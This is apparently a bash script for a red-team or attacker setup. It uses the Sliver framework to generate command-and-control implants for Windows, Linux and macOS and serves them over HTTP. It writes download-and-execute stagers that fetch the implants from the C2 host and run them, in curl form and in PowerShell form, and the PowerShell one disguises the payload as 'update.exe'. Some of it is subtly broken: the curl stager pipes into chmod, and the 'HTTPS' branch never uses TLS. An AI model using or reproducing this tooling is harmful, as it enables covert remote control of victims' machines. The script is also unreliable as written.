#!/bin/bash
# Beacon server script to host generated implants

# Configuration
BEACONS_DIR="/opt/beacons"
WEBSERVER_PORT=8443
CERTIFICATE="/etc/ssl/private/beacon-server.pem"
KEY="/etc/ssl/private/beacon-server.key"

# Set secure umask
umask 077

# Ensure beacons directory exists
mkdir -p $BEACONS_DIR

# Function to generate beacons using Sliver
generate_beacons() {
    echo "[+] Generating beacons for all platforms..."
    
    # Make sure Sliver server is running
    if ! pgrep -x "sliver-server" > /dev/null; then
        echo "[!] Sliver server is not running, starting it..."
        systemctl start sliver
        sleep 5
    fi
    
    # Generate Windows beacon
    sliver-cli generate --http $C2_HOST:8888 --os windows --arch amd64 --save $BEACONS_DIR/windows.exe
    
    # Generate Linux beacon
    sliver-cli generate --http $C2_HOST:8888 --os linux --arch amd64 --save $BEACONS_DIR/linux
    
    # Generate macOS beacon
    sliver-cli generate --http $C2_HOST:8888 --os darwin --arch amd64 --save $BEACONS_DIR/macos
    
    # Generate stagers
    echo "#!/bin/bash
curl -s $C2_HOST:8443/linux | chmod +x && ./linux" > $BEACONS_DIR/beacon.sh
    chmod +x $BEACONS_DIR/beacon.sh
    
    echo "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
\$url = 'http://$C2_HOST:8443/windows.exe';
\$outpath = \"\$env:TEMP\\update.exe\";
Invoke-WebRequest -Uri \$url -OutFile \$outpath;
Start-Process -NoNewWindow -FilePath \$outpath;" > $BEACONS_DIR/beacon.ps1
    
    echo "[+] All beacons generated successfully"
}

# Generate beacons
generate_beacons

# Serve beacons using Python's HTTP server (with SSL if certificate exists)
if [ -f "$CERTIFICATE" ] && [ -f "$KEY" ]; then
    echo "[+] Starting HTTPS server on port $WEBSERVER_PORT..."
    cd $BEACONS_DIR
    python3 -m http.server $WEBSERVER_PORT --bind 0.0.0.0 &
    SERVER_PID=$!
else
    echo "[+] Starting HTTP server on port $WEBSERVER_PORT..."
    cd $BEACONS_DIR
    python3 -m http.server $WEBSERVER_PORT --bind 0.0.0.0 &
    SERVER_PID=$!
fi

echo "[+] Beacon server started with PID $SERVER_PID"
echo "[+] Beacons available at http(s)://$C2_HOST:$WEBSERVER_PORT/"
echo "[+] Press Ctrl+C to stop the server"

# Keep script running and respond to Ctrl+C
trap "kill $SERVER_PID; echo '[+] Beacon server stopped'; exit 0" INT
while true; do sleep 1; done